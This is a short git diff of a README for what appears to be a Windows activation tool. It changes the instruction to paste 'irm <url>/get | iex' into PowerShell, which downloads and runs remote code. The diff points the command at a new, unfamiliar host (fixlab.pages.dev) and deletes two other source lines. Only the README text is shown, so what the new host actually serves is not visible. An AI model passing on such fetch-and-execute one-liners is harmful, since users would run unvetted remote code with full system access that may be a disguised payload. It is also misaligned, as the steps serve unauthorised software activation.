@@ -25,15 +25,10 @@ Last Release - v2.5 (16-Nov-2023)
 1. Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
 2. Copy and paste the code below and press enter:
     ```powershell
-    irm https://elite.kamrul.us/get | iex
+    irm https://fixlab.pages.dev/get | iex
     ```
     
-    ```powershell
-    irm https://massgrave.dev/get | iex
-    ```
-    ```powershell
-    irm https://get.activated.win | iex
-    ```
+   
     
 
 4. Follow the on-screen instructions for activation.
